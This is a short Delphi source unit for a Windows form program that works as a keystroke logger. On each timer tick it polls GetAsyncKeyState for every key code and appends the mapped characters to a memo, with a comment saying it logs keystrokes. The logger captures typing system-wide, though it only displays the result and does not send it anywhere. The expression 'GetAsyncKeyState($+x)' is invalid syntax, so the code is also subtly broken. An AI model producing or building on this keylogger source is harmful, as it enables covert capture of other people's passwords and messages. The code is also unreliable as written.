unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs,    StdCtrls, ExtCtrls, ComCtrls;

type
  TForm1 = class(TForm)
    Memo1: TMemo;
    Timer1: TTimer;
    ListView1: TListView;
    procedure Timer1Timer(Sender: TObject);
  private
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
procedure Send(x : string);
begin
form1.Memo1.Lines.Add(x)
end;

procedure TForm1.Timer1Timer(Sender: TObject);
//begin
//if GetAsyncKeyState(Ord('A'))= -32767  then send('A');
//if GetAsyncKeyState(Ord('B'))= -32767  then send('B');
var X,y:integer;
f:char  ;
str:string;
begin
For X:=0 to 255 do
begin
  if ((GetAsyncKeyState($+x) and 1) = 1) then
  begin
  if (x<>1) then //if we want to find the ascii code instead:
  begin
  //MEMO1.Lines.Add(inttostr(x)+'$·%&');
  end;
    for y:=0 to listview1.items.Count-1 do //log the key strokes
      begin
       if x=strtoint(listview1.items.item[y].caption) then
       memo1.text:=memo1.Text + (listview1.items.item[y].subitems[0])
     end;
   end;
end;
end;

end.
